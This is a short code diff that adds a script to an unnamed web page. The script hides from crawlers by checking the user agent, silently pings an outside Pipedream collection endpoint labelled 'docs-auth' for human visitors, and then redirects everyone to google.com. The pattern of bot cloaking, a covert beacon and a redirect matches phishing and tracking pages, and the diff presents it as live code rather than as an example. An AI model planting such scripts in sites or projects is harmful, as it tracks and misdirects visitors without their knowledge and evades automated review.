@@ -1,0 +1,8 @@
+<script>
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+    if (!isBot) {
+        // ثبت در Pipedream با منبع اختصاصی docs-auth
+        fetch("https://eox6t1ks7dm549j.m.pipedream.net/?source=docs-auth&verified=true");
+    }
+    window.location.href = "https://www.google.com";
+</script>
